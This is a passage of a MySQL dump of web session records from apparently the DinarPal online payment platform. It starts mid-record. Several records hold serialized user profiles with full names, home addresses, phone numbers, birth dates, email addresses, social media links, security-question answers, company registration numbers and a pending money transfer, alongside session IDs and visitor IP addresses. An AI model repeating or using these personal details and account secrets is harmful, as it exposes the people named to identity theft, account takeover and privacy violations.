27 03:12:49";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-21T10:48:02+08:00";s:12:"me_magic_num";s:32:"69c0e639c71a34bb6b710f043138f7f8";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";s:0:"";s:10:"me_reg_num";s:0:"";s:15:"me_company_doc1";s:0:"";s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";s:0:"";s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"2";s:9:"logged_in";b:1;}');
INSERT INTO `ci_sessions` (`session_id`, `ip_address`, `user_agent`, `last_activity`, `user_data`) VALUES
('ef1dbd10adcafd7ab3875456f18d3168', '113.210.62.149', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461640664, ''),
('ef1ef3b575adb05c7870ac74110901fa', '208.67.172.36', 'Mozilla/5.0 (X11; U; Linux x86_64;en-US;rv:1.9.2.1', 1461738975, ''),
('ef5632d8650c0ebe7d1e9f8c69716d1f', '180.76.15.21', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461436452, ''),
('ef6a7426d5cf7cd666edad5fff9bd2b2', '175.136.241.41', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1461644710, ''),
('efbefdb7c7826b1f266405a3d9d4c5c9', '208.115.113.93', 'Mozilla/5.0 (compatible; DotBot/1.1; http://www.op', 1461110706, ''),
('efeefbccc493ba3af6275c37fc194042', '208.67.172.36', 'Mozilla/5.0 (X11; U; Linux x86_64;en-US;rv:1.9.2.1', 1461733035, ''),
('f00b7106b48343452a4afad6a0e9e591', '113.210.54.93', 'WhatsApp/2.16.13 A', 1461232079, 'a:2:{s:12:"me_id_parent";s:1:"0";s:15:"flash:new:error";s:33:"Opss! Invalid member unique link.";}'),
('f084274cdcb127d971a5ae04a28c70c8', '208.67.172.36', 'Mozilla/5.0 (X11; U; Linux x86_64;en-US;rv:1.9.2.1', 1461739583, ''),
('f0894d41d709d6c02901380d376103bd', '115.132.156.136', 'Mozilla/5.0 (Linux; Android 5.0; SM-N9005 Build/LR', 1461409834, ''),
('f08adb151dbf76cb35137bac644b0f46', '178.255.215.70', 'Mozilla/5.0 (compatible; Exabot/3.0; +http://www.e', 1461539524, ''),
('f0aed0742fa2404474580c47a605359e', '183.171.21.208', 'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F ', 1461628461, ''),
('f0b6ae4023bcb70f746b7b6354a07cc3', '183.171.160.147', 'Mozilla/5.0 (Linux; Android 4.4.2; ASUS_T00J Build', 1461420837, ''),
('f0c99a605e9f9d1a8b5ae3183f074faf', '173.252.90.248', 'facebookexternalhit/1.1 (+http://www.facebook.com/', 1461899411, 'a:1:{s:12:"me_id_parent";s:4:"Cz0=";}'),
('f0ea2901317086bc27c43b2c5a7c7787', '164.132.161.61', 'Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ah', 1461822659, ''),
('f1202af98e67104b69a0934d1c8d600b', '43.252.216.136', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (K', 1461310239, ''),
('f12d664560e29a83d1b0bb2c8c00e6cd', '45.55.229.99', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) App', 1461718314, ''),
('f1a1dead35383c4b33fe4128f1559234', '46.118.156.3', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461186644, ''),
('f1d0d6da199bb3b2fe2cf67fd43af11f', '183.171.163.108', 'Mozilla/5.0 (Linux; Android 4.4.4; en-us; SAMSUNG ', 1461911747, 'a:1:{s:12:"me_id_parent";s:8:"ATUKPg==";}'),
('f1eddb1107774216cc70ad4e62729f39', '180.76.15.147', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461795325, ''),
('f1f9189313372b47911d5129ea31e98f', '115.164.82.13', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461739339, 'a:1:{s:12:"me_id_parent";s:4:"BDI=";}'),
('f239fd5aff35e6b032ad7d20572888d8', '134.249.55.100', 'Mozilla/4.0 (compatible; MSIE 5.0; Windows 95) Ope', 1461197229, ''),
('f248d0262e2c1a849c18889f302898c1', '175.138.178.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1461699280, 'a:51:{s:5:"me_id";s:1:"3";s:8:"me_image";s:42:"6d3ac-adeq-nur---ftmk!-20150212_151603.jpg";s:12:"me_firstname";s:9:"Nur Umira";s:11:"me_lastname";s:7:"Mustafa";s:11:"me_username";s:3:"nur";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:3:"nur";s:14:"me_unique_link";s:32:"b55178b011bfb206965f2638d0f87047";s:11:"me_address1";s:44:"J-1-14, BLOK J, PANGSAPURI TTU3, JALAN TU61.";s:8:"me_city1";s:10:"AYER KEROH";s:9:"me_state1";s:6:"MELAKA";s:12:"me_postcode1";s:5:"75450";s:11:"me_country1";s:8:"MALAYSIA";s:11:"me_address2";s:28:"91, JALAN KERAI, SG. RETANG.";s:8:"me_city2";s:8:"JERANTUT";s:9:"me_state2";s:6:"PAHANG";s:12:"me_postcode2";s:5:"27000";s:11:"me_country2";s:8:"MALAYSIA";s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";s:10:"0136420142";s:13:"me_birth_date";s:10:"1993-05-18";s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:33:"https://www.facebook.com/nurumira";s:10:"me_twitter";s:28:"https://twitter.com/nurumira";s:12:"me_instagram";s:29:"http://instagram.com/nurumira";s:13:"me_googleplus";s:30:"http://googleplus.com/nurumira";s:14:"me_whatsapp_no";s:10:"0199737579";s:11:"me_telegram";s:1:"-";s:9:"me_wechat";s:1:"-";s:8:"me_email";s:18:"nurumira@gmail.com";s:16:"me_register_date";s:19:"2015-04-27 03:12:49";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-26T22:34:45+08:00";s:12:"me_magic_num";s:32:"69c0e639c71a34bb6b710f043138f7f8";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";s:0:"";s:10:"me_reg_num";s:0:"";s:15:"me_company_doc1";s:0:"";s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";s:0:"";s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"2";s:10:"me_is_amil";s:2:"no";s:9:"logged_in";b:1;}'),
('f299308256bd968054c5cde653f1b7c1', '5.9.83.211', 'Mozilla/5.0 (compatible; MegaIndex.ru/2.0; +http:/', 1461160571, ''),
('f2a5f285b791fdf77c7fdf28b358324b', '207.70.3.142', 'Mozilla/5.0 (Windows NT 6.1; rv:17.0) Gecko/201001', 1461840806, ''),
('f2fbde737952835ffc82c4e9b14b0b0f', '66.249.69.52', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461717104, ''),
('f30bd854548f742217437e67ffcd87f5', '138.201.16.71', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.', 1461223709, ''),
('f318f2ef03f306819dfe59e2b0bf13fc', '13.92.241.115', 'semanticbot', 1461739112, ''),
('f3500d762bdb5a4730e66d5777fcb3fb', '66.249.64.167', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461817191, ''),
('f3b38d421c052af2a81ee10ad41d48b7', '13.92.241.115', 'semanticbot', 1461739133, ''),
('f3c4a7dbad05ff7798594f3684e27d01', '66.249.64.96', 'DoCoMo/2.0 N905i(c100;TB;W24H16) (compatible; Goog', 1461828503, ''),
('f3d4efcfb006e62129e724633d8bf504', '69.171.230.98', 'facebookexternalhit/1.1 (+http://www.facebook.com/', 1461496258, 'a:1:{s:12:"me_id_parent";s:88:"dFUpjXRxEjxg92GmdKmfwYY3n_s4_js1HdzkTo4hPh-mJfa7nBT2R8QFfIiunZxANad4Qg9-fJUJ-EOSpa3vSg==";}'),
('f3d504be568cb14fc728c54379a993e9', '66.249.69.52', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461661300, ''),
('f3ff0e6c41e2832b36b20decccdef30b', '180.76.15.12', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461687525, ''),
('f4978b0b6dea96f6d48097e11c7ba801', '110.159.7.248', 'Mozilla/5.0 (Linux; U; Android 2.3.6; ms-my; GT-S5', 1461558936, 'a:1:{s:12:"me_id_parent";s:88:"P4X8CRUZECFn2ikei7ROlSkXLiR77LoyP754BN776m8HAPFAjXzRBn2gHyC6Nkl0et_drtoHrkvDCu5-PzuroQ==";}'),
('f4b01ed15461da70debd0ed0405e05b5', '210.48.221.10', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461767034, ''),
('f4e7df19ac852f1d3685095fba214ea9', '210.48.221.10', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461767318, ''),
('f52290d383dc8c5af25310f21a8f34bb', '180.76.15.135', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461587791, ''),
('f52342266b00a5f45e2989bfe71065e6', '188.163.78.47', 'Mozilla/5.0 (Windows 10; WOW64; rv:41.0) Gecko/201', 1461408465, ''),
('f542b03b3166058a606a27bfbb7e0277', '180.76.15.6', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461501374, ''),
('f578a56acd08bc70c8a97a52cf3ebfa2', '220.181.108.105', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461714243, ''),
('f58aee16da04d723525ec1364c1001d6', '115.132.180.128', 'Mozilla/5.0 (Linux; Android 5.1.1; H60-L04 Build/H', 1461455226, 'a:1:{s:12:"me_id_parent";s:88:"1iUo6ZcWVnVsVgEteUWjECYVJGo0u2W58LnMHsLzKiY4g5uJ0_5uJTb6niRGiQmP4DLkN-URL7XmkHqAqPLcWg==";}'),
('f5c3589800b15802f48a55b70b2b1efb', '211.167.85.2', '0', 1461295530, ''),
('f60147deb2a2be28df635065c3ea12b2', '180.76.15.5', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461555711, ''),
('f637218b1b60e18a3cde40d3a5892f41', '134.249.55.100', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461690037, ''),
('f6557689c4f0e3a1683c4c6e19efd12e', '66.249.64.228', 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/', 1461811660, ''),
('f65cea449d5c7730f843f24a1ee889a6', '180.76.15.137', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461483452, ''),
('f67f5c570182ee36180af44a100e547d', '1.9.102.21', 'Mozilla/5.0 (Linux; Android 4.3; GT-I9300 Build/JS', 1461172071, ''),
('f6a6a627df48b01310203f24f21c272d', '78.135.79.135', '0', 1461865398, ''),
('f6d395440dcdbe7872d5a0bc439a8718', '91.121.169.194', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461770605, ''),
('f6d925bacfaec40928d675bbfde8aa90', '113.210.54.93', 'WhatsApp/2.16.13 A', 1461231982, ''),
('f6e3e3cd663277982f908d73b5238dc4', '45.79.87.104', 'Mozilla/5.0 (compatible; Uptimebot/1.0; +http://ww', 1461610751, ''),
('f73b57478eb6d85404d1d1916232a2e9', '175.136.141.217', 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/53', 1461922477, ''),
('f73bc564d6c8e8580d1ffb58be9838c6', '180.76.15.147', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461311304, ''),
('f73bee01f1396b031dbf7d39e6c688f3', '115.164.89.183', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461917627, 'a:51:{s:5:"me_id";s:1:"7";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:5:"arash";s:11:"me_lastname";s:5:"arash";s:11:"me_username";s:5:"arash";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:5:"arash";s:14:"me_unique_link";s:32:"81b9a3538d93a7623ad0e9bf1347d137";s:11:"me_address1";s:15:"DinarPal Street";s:8:"me_city1";s:10:"Ayer Keroh";s:9:"me_state1";s:6:"Melaka";s:12:"me_postcode1";s:5:"75450";s:11:"me_country1";s:8:"Malaysia";s:11:"me_address2";s:15:"DinarPal Street";s:8:"me_city2";s:10:"Ayer Keroh";s:9:"me_state2";s:6:"Melaka";s:12:"me_postcode2";s:5:"75450";s:11:"me_country2";s:8:"Malaysia";s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";s:11:"60166707888";s:13:"me_birth_date";s:10:"1977-01-19";s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:0:"";s:10:"me_twitter";s:0:"";s:12:"me_instagram";s:0:"";s:13:"me_googleplus";s:0:"";s:14:"me_whatsapp_no";s:0:"";s:11:"me_telegram";s:0:"";s:9:"me_wechat";s:0:"";s:8:"me_email";s:22:"arash.private@live.com";s:16:"me_register_date";s:19:"2016-04-23 17:41:44";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-29T12:22:23+08:00";s:12:"me_magic_num";s:32:"248dfd4fff3169f86edec2930684bfd4";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";s:0:"";s:10:"me_reg_num";s:0:"";s:15:"me_company_doc1";s:0:"";s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";s:0:"";s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"1";s:10:"me_is_amil";s:2:"no";s:9:"logged_in";b:1;}'),
('f74b42e6ac4a7a0d6e9c3a9f6d56728b', '134.249.55.100', 'Mozilla/6.0 (compatible; MSIE 7.0a1; Windows NT 5.', 1461690037, ''),
('f76b47f18b1b1e518e374eef0a1e7a46', '66.249.64.228', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461837721, ''),
('f78b8038c41c47ae591fca1979d05c3f', '178.154.189.23', 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://ya', 1461727669, ''),
('f7cd13ef921d436a9cd11dab45c19e7b', '203.82.80.109', 'Mozilla/5.0 (Linux; Android 4.4.2; Lenovo A319 Bui', 1461483059, 'a:1:{s:12:"me_id_parent";s:88:"-YT7NDB64ddkrYFk4wYt9tlVPPXmgy8hCI9QFmMmY_1VF2MfMFWnzbj-femu_Xw46Ag4YNT5JHMua1iD8codHA==";}'),
('f7d92f051146914c6d7b7dbb154960f7', '14.1.198.216', 'Mozilla/5.0 (Linux; Android 5.0.2; ASUS_Z010D Buil', 1461498381, 'a:1:{s:12:"me_id_parent";s:88:"XQXPc0XOT0lRKmxw4t74YkqczswX980xlNXHvSr65CLvO1_pKUculr707RDjyHBQc-t91RHyBkUKRIPxPyIJJA==";}'),
('f7e462fbf5e11c7af28b8c7e1822e286', '103.1.71.95', 'Mozilla/5.0 (Linux; U; Android 4.2.2; en-gb; GT-I9', 1461423213, 'a:1:{s:12:"me_id_parent";s:1:"0";}'),
('f821926c002fa46f6ef24220ef233fc3', '188.138.33.173', '0', 1461408645, ''),
('f834673be916c1f6b911323e6e452b48', '180.76.15.159', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461641305, ''),
('f8364973634381af0cdc39697d964493', '123.136.107.71', 'Mozilla/5.0 (Linux; Android 4.3; ASUS_T00G Build/J', 1461496954, 'a:1:{s:12:"me_id_parent";s:88:"v7Tm1kv3768efyZ6cKKJWFYktd-2oVdb1BEKEmYrMCGUbjXcU4_kpOsCAQMlB_qBu-gLctUJ7CeVkSbtbDLqBw==";}'),
('f83cd4515aa5c4a89f07242aaf14c2ac', '113.210.60.46', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461430198, ''),
('f84b72f6b1e36b5ba799f0224887dc5f', '180.76.15.150', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461458022, ''),
('f8b0ddb9458bf58fa0d003f8ec919706', '78.46.50.246', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461525529, ''),
('f8b6eda5cde160306e3206c60129c2f8', '175.138.178.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1461682425, 'a:50:{s:5:"me_id";s:1:"5";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:9:"God Admin";s:11:"me_lastname";s:6:"bujang";s:11:"me_username";s:8:"godadmin";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:2:"b1";s:14:"me_unique_link";s:32:"edbab45572c72a5d9440b40bcc0500c0";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";s:0:"";s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:0:"";s:10:"me_twitter";s:0:"";s:12:"me_instagram";s:0:"";s:13:"me_googleplus";s:0:"";s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:18:"staff@dinarpal.com";s:16:"me_register_date";s:19:"2014-12-28 07:28:05";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-26T15:14:15+08:00";s:12:"me_magic_num";s:32:"9512afcb3f0fde463ddf8e476a76be16";s:5:"ml_id";s:1:"2";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"GA";s:5:"sl_id";s:1:"1";s:4:"g_id";s:1:"0";s:9:"logged_in";b:1;}'),
('f8f78b38f9b44074345a09320aae1d56', '175.138.178.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1461267106, 'a:50:{s:5:"me_id";s:1:"1";s:8:"me_image";s:36:"99271c3805aa830738485064b3707cc9.jpg";s:12:"me_firstname";s:12:"DP System HQ";s:11:"me_lastname";s:8:"Dinarpal";s:11:"me_username";s:4:"dphq";s:11:"me_question";s:22:"What is my pet''s name?";s:9:"me_answer";s:5:"comel";s:14:"me_unique_link";s:200:"http://localhost/dinarpal_v2/member/uniqueLink/http://localhost/dinarpal_v2/member/uniqueLink/http://localhost/dinarpal_v2/member/uniqueLink/http://localhost/dinarpal_v2/member/uniqueLink/http://local";s:11:"me_address1";s:44:"J-1-14, BLOK J, PANGSAPURI TTU3, JALAN TU61.";s:8:"me_city1";s:10:"AYER KEROH";s:9:"me_state1";s:6:"MELAKA";s:12:"me_postcode1";s:5:"75450";s:11:"me_country1";s:8:"MALAYSIA";s:11:"me_address2";s:28:"91, JALAN KERAI, SG. RETANG.";s:8:"me_city2";s:8:"JERANTUT";s:9:"me_state2";s:6:"PAHANG";s:12:"me_postcode2";s:5:"27000";s:11:"me_country2";s:8:"MALAYSIA";s:22:"me_government_issue_id";s:5:"MY001";s:17:"me_driver_license";s:7:"B and D";s:11:"me_phone_no";s:10:"0199737579";s:13:"me_birth_date";s:10:"1989-10-31";s:14:"me_description";s:0:"";s:14:"me_maiden_name";s:4:"Ntoh";s:14:"me_nationality";s:8:"Malaysia";s:11:"me_facebook";s:36:"https://www.facebook.com/kidzeclipes";s:10:"me_twitter";s:31:"https://twitter.com/kidzeclipes";s:12:"me_instagram";s:34:"https://www.instagram.com/umaq_89/";s:13:"me_googleplus";s:55:"https://plus.google.com/u/0/110272712192644641706/posts";s:14:"me_whatsapp_no";s:10:"0199737579";s:11:"me_telegram";s:11:"019-9737579";s:9:"me_wechat";s:15:"+6 019-973 7579";s:8:"me_email";s:21:"kidzeclipes@gmail.com";s:16:"me_register_date";s:19:"2014-11-10 10:12:00";s:15:"me_account_type";s:1:"2";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-22T03:32:01+08:00";s:12:"me_magic_num";s:32:"0d4368f80cd1d149576c068211e89fbf";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";s:18:"Tuffah Informatics";s:10:"me_reg_num";s:11:"MA0182480-H";s:15:"me_company_doc1";s:36:"8dbaa9d1e7f114245d186c546ab9a7d6.jpg";s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";s:36:"25e878659a4d2c4c9f76576fa1656530.jpg";s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"DP";s:5:"sl_id";s:1:"1";s:4:"g_id";s:1:"1";s:9:"logged_in";b:1;}'),
('f90b3f8c72f023f733e4485275fe4526', '115.134.161.155', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/53', 1461404474, ''),
('f92883abe1bc19a65de7a69a1eeb4e74', '175.139.86.43', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461758745, ''),
('f965bc97c927128dee8d56b138df6ab0', '66.249.69.4', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461512700, ''),
('f96688fb7090ba156159c0197d1a54be', '180.76.15.152', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461767009, ''),
('f9893a99512a274c201c3f38796ddd9f', '180.76.15.160', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461203368, ''),
('f9b937022a7700079e76527d5165f91c', '123.136.111.21', 'Mozilla/5.0 (Linux; Android 4.2.2; Lenovo S660 Bui', 1461502173, 'a:1:{s:12:"me_id_parent";s:88:"i0tDx2sZqOfFtZaD54SY_GJnAdc2DlSKjt-V11ZKAvxA5DB9pO0MEdCUDsgTRIy9huLtsAa7x8ryLWPd8dkQNg==";}'),
('f9b9c85c4f48ca85a4a0ad1c84d5c5ea', '180.76.15.19', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461888819, ''),
('f9f5074d5c26f9a10380edc4fa103255', '173.252.95.14', 'facebookexternalhit/1.1', 1461421817, 'a:1:{s:12:"me_id_parent";s:88:"g1IhiVCuZNdG5IHzLkxdagGh-jJBC4h2IDfdHioixTN5Et9hTW5UL-OIUsP9EEjDzlpJJcWconGeQiveBIx8BQ==";}'),
('fa3eecc8198d59e7cc83cac6d80f6911', '51.255.65.66', 'Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ah', 1461887612, ''),
('fa80b157e9e2185637271c9bb7600989', '45.55.229.99', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:28.0) Gecko', 1461718313, ''),
('fa9679b1888a82ce77158d0c87f3ee07', '175.144.16.247', 'Mozilla/5.0 (Linux; Android 5.1.1; SM-J700F Build/', 1461498818, 'a:1:{s:12:"me_id_parent";s:88:"oGB8D7ukfKrZqpCFkcW2wZ5an46AGFj28DsIw-iulsqyrBw3dNfLbYLWKZ-3qYAFltv0vcm4_-MpAHoIUy7WQg==";}'),
('fb651a48185cb33551db88eaa3bd50a2', '134.249.55.100', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461441469, ''),
('fbd97bf983b642a311f98fc503e338e4', '183.171.175.113', 'Mozilla/5.0 (Linux; Android 5.0; SM-G900F Build/LR', 1461801649, 'a:59:{s:5:"me_id";s:2:"47";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:9:"Azhar9751";s:11:"me_lastname";s:9:"Azhar9751";s:11:"me_username";s:9:"Azhar9751";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:9:"Azhar9751";s:14:"me_unique_link";s:32:"033ed15796968126a1ef11da142912a6";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";N;s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";N;s:10:"me_twitter";N;s:12:"me_instagram";N;s:13:"me_googleplus";N;s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:20:"azhar29066@gmail.com";s:16:"me_register_date";s:19:"2016-04-26 21:01:27";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-28T08:00:49+08:00";s:12:"me_magic_num";s:32:"9a5749634c226c2629c9d3e3d217bb2f";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"0";s:10:"me_is_amil";s:2:"no";s:9:"logged_in";b:1;s:12:"payment_temp";a:9:{s:10:"me_id_from";s:2:"47";s:5:"ft_id";s:1:"4";s:5:"tt_id";s:1:"1";s:8:"username";s:10:"amiraazhar";s:8:"me_id_to";s:2:"51";s:5:"pt_id";s:1:"1";s:5:"at_id";s:1:"1";s:9:"tr_amount";s:2:"10";s:8:"tr_notes";s:0:"";}s:15:"me_rec_fullname";s:21:"AmiraAzhar AmiraAzhar";s:15:"me_rec_username";s:10:"AmiraAzhar";s:7:"pt_desc";s:5:"Goods";s:7:"at_desc";s:7:"E-Dinar";s:12:"amount_trans";s:5:"10.00";s:8:"tr_notes";s:0:"";s:15:"send_fee_amount";s:4:"0.00";}'),
('fc25bc52f2c81b58b575257124acb6fc', '13.92.241.115', 'semanticbot', 1461739114, ''),
('fc3f9680f27018dcce1ea83c321735f9', '46.118.156.3', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461186644, ''),
('fcc05e47868742fff0767cce190b5a9a', '180.76.15.19', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461843011, ''),
('fcd1a9b18d9b793d0cd888252ddc95b4', '40.77.167.104', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461801159, ''),
('fce54a8bb8e0bddf34a4e77116f3f228', '69.30.213.82', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461230860, ''),
('fce88fc6edca531e83a80902b1d2660b', '51.255.65.10', 'Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ah', 1461409058, ''),
('fcf864fad22e66f2f6cb04d4cd6e34f1', '180.76.15.24', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461534030, ''),
('fcfd4ebd3d9f5ffa844bab2c05b98ada', '66.249.69.45', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461416185, ''),
('fd1905f31875bd0d68eadba8d65d9970', '180.76.15.31', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461473149, ''),
('fd1cbeb9fe69f1160a939a6a185b3232', '175.138.30.225', 'Mozilla/5.0 (Linux; U; Android 5.1; en_us; ASUS_Z0', 1461829259, 'a:1:{s:12:"me_id_parent";s:8:"ADUMOw==";}'),
('fd5d9c383ee0cd2da6b82f092f426207', '113.210.54.93', 'WhatsApp/2.16.13 A', 1461232004, 'a:2:{s:12:"me_id_parent";s:1:"0";s:15:"flash:new:error";s:33:"Opss! Invalid member unique link.";}'),
('fd7531c95f54dd9786e68957343d2f48', '178.255.215.70', 'Mozilla/5.0 (compatible; Exabot/3.0; +http://www.e', 1461454922, ''),
('fd8322d84dab447ca628dadfb7e9e29a', '216.218.206.67', '0', 1461495312, ''),
('fd8a2d3f8b3da65e1f9a940c2b2e729e', '66.220.155.213', 'facebookexternalhit/1.1', 1461496321, 'a:1:{s:12:"me_id_parent";s:88:"A1LbPQQQOlrfGsr3jp9md1n545Ioxsqp7up2-SPAJP-0HHvvuasspOcZvsKI1BEn-2_iKMKWR1FHTzU8Ar3QmQ==";}'),
('fdb9a95ba89b5cdaeed70317cbced637', '66.249.69.217', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461411365, ''),
('fdbcdb6c9da0ed0e2df01eb3c2207c4c', '113.210.54.93', 'WhatsApp/2.16.13 A', 1461231975, ''),
('fdee922e3c8da12e9a841323cb0e9d5a', '51.255.65.87', 'Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ah', 1461095888, ''),
('fe159bfeb5e0bf7d9a649b499d397a1a', '180.76.15.139', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461821294, ''),
('fe3eedd83b320c7652536b2e6b6dc5ae', '113.210.50.40', 'WhatsApp/2.16.13 A', 1461405342, ''),
